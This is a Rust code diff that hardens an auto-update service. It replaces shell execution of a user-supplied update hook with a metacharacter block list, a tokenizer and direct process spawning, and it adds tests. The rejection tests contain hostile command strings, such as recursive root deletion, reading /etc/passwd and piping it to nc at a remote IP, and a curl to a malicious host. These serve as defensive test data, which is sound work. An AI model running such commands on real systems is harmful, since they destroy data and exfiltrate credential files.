@@ -326,13 +326,9 @@ impl AutoUpdateService {
             }
         }
 
-        // If a custom update hook is defined, run it in background
+        // If a custom update hook is defined, run it safely in background (SEC-03)
         if let Ok(hook_cmd) = std::env::var("XAVIER_UPDATE_HOOK") {
-            info!("Executing custom update hook: {}", hook_cmd);
-            let _ = std::process::Command::new("sh")
-                .arg("-c")
-                .arg(&hook_cmd)
-                .spawn();
+            Self::execute_update_hook(&hook_cmd);
         }
 
         // Format user-friendly notification message with improvements and details link
@@ -498,11 +494,145 @@ impl AutoUpdateService {
             Err(e) => Err(e),
         }
     }
+
+    /// Safely executes a custom update hook command.
+    ///
+    /// Eliminates raw shell string injection (SEC-03) by rejecting dangerous shell
+    /// chaining metacharacters, tokenizing into program and arguments respecting quotes,
+    /// and spawning the process directly without an intermediary shell.
+    pub fn execute_update_hook(hook_cmd: &str) -> Option<u32> {
+        execute_update_hook(hook_cmd)
+    }
 }
 
 impl Default for AutoUpdateService {
     fn default() -> Self {
         Self::new()
+    }
+}
+
+/// Dangerous shell chaining metacharacters rejected to prevent command injection (SEC-03).
+pub const DANGEROUS_SHELL_METACHARS: &[&str] = &[";", "&&", "||", "|", "`", "$("];
+
+/// Validates that `hook_cmd` does not contain dangerous shell chaining metacharacters
+/// and tokenizes it into program and argument tokens respecting quotes.
+pub fn validate_and_tokenize_hook(hook_cmd: &str) -> Result<Vec<String>, String> {
+    let trimmed = hook_cmd.trim();
+    if trimmed.is_empty() {
+        return Err("Hook command string is empty".to_string());
+    }
+
+    for metachar in DANGEROUS_SHELL_METACHARS {
+        if trimmed.contains(metachar) {
+            return Err(format!(
+                "dangerous shell metacharacter '{}' detected",
+                metachar
+            ));
+        }
+    }
+
+    tokenize_command(trimmed)
+}
+
+/// Tokenizes a command line string into program and arguments respecting single and double quotes.
+pub fn tokenize_command(cmd: &str) -> Result<Vec<String>, String> {
+    let mut tokens = Vec::new();
+    let mut current = String::new();
+    let mut in_token = false;
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+    let mut chars = cmd.chars().peekable();
+
+    while let Some(c) = chars.next() {
+        match c {
+            '\\' if !in_single_quote => {
+                in_token = true;
+                if let Some(next_c) = chars.next() {
+                    current.push(next_c);
+                } else {
+                    current.push('\\');
+                }
+            }
+            '\'' if !in_double_quote => {
+                in_token = true;
+                in_single_quote = !in_single_quote;
+            }
+            '"' if !in_single_quote => {
+                in_token = true;
+                in_double_quote = !in_double_quote;
+            }
+            c if c.is_whitespace() && !in_single_quote && !in_double_quote => {
+                if in_token {
+                    tokens.push(std::mem::take(&mut current));
+                    in_token = false;
+                }
+            }
+            c => {
+                in_token = true;
+                current.push(c);
+            }
+        }
+    }
+
+    if in_single_quote || in_double_quote {
+        return Err("Unclosed quote in command string".to_string());
+    }
+
+    if in_token {
+        tokens.push(current);
+    }
+
+    if tokens.is_empty() {
+        return Err("Empty command string".to_string());
+    }
+
+    Ok(tokens)
+}
+
+/// Safely executes an update hook command without invoking an intermediary shell.
+/// Rejects commands containing shell chaining metacharacters, tokenizes arguments,
+/// and executes the program directly with its argument slice.
+pub fn execute_update_hook(hook_cmd: &str) -> Option<u32> {
+    match validate_and_tokenize_hook(hook_cmd) {
+        Ok(tokens) => {
+            let program = &tokens[0];
+            let args = &tokens[1..];
+            info!(
+                "Executing custom update hook: program='{}', arg_count={}, args={:?}",
+                program,
+                args.len(),
+                args
+            );
+
+            match std::process::Command::new(program).args(args).spawn() {
+                Ok(child) => {
+                    let child_pid = child.id();
+                    info!(
+                        "Update hook spawned successfully: program='{}', arg_count={}, child_pid={}",
+                        program,
+                        args.len(),
+                        child_pid
+                    );
+                    Some(child_pid)
+                }
+                Err(err) => {
+                    warn!(
+                        "Failed to spawn custom update hook program '{}' (arg_count={}): {}",
+                        program,
+                        args.len(),
+                        err
+                    );
+                    None
+                }
+            }
+        }
+        Err(err) => {
+            warn!(
+                "XAVIER_UPDATE_HOOK rejected: {}: hook_cmd='{}'",
+                err, hook_cmd
+            );
+            None
+        }
     }
 }
 
@@ -920,5 +1050,80 @@ mod tests {
         let report = service.run_startup_check().await.unwrap();
         assert_eq!(report.status, "quarantined");
         assert!(!report.applied);
+    }
+
+    #[test]
+    fn test_update_hook_metacharacter_rejection() {
+        let dangerous_commands = [
+            "systemctl restart xavier; rm -rf /",
+            "echo update && curl http://malicious.com",
+            "echo update || cat /etc/passwd",
+            "cat /etc/passwd | nc 1.2.3.4 9999",
+            "echo `whoami`",
+            "echo $(whoami)",
+            "test;ls",
+            "test&&ls",
+            "test||ls",
+            "test|ls",
+        ];
+
+        for cmd in dangerous_commands {
+            let res = validate_and_tokenize_hook(cmd);
+            assert!(
+                res.is_err(),
+                "Expected rejection of dangerous command: {}",
+                cmd
+            );
+            let pid = execute_update_hook(cmd);
+            assert!(
+                pid.is_none(),
+                "Expected execute_update_hook to return None for: {}",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn test_update_hook_tokenization_and_quotes() {
+        let cmd = r#"systemctl restart "xavier-daemon" --mode 'fast' --dry-run"#;
+        let tokens = validate_and_tokenize_hook(cmd).unwrap();
+        assert_eq!(
+            tokens,
+            vec![
+                "systemctl",
+                "restart",
+                "xavier-daemon",
+                "--mode",
+                "fast",
+                "--dry-run"
+            ]
+        );
+
+        // Test unclosed quotes
+        assert!(validate_and_tokenize_hook(r#"echo "unclosed"#).is_err());
+        assert!(validate_and_tokenize_hook(r#"echo 'unclosed"#).is_err());
+
+        // Test empty strings
+        assert!(validate_and_tokenize_hook("").is_err());
+        assert!(validate_and_tokenize_hook("   \t  \n ").is_err());
+    }
+
+    #[test]
+    fn test_update_hook_safe_execution() {
+        #[cfg(unix)]
+        {
+            let pid = execute_update_hook("true");
+            assert!(pid.is_some(), "Expected 'true' to spawn successfully");
+
+            let pid_with_args = execute_update_hook("echo 'Update hook executed successfully'");
+            assert!(
+                pid_with_args.is_some(),
+                "Expected 'echo' with args to spawn successfully"
+            );
+        }
+
+        // Non-existent binary should gracefully return None
+        let pid_missing = execute_update_hook("non_existent_binary_xyz_12345 --flag");
+        assert!(pid_missing.is_none());
     }
 }
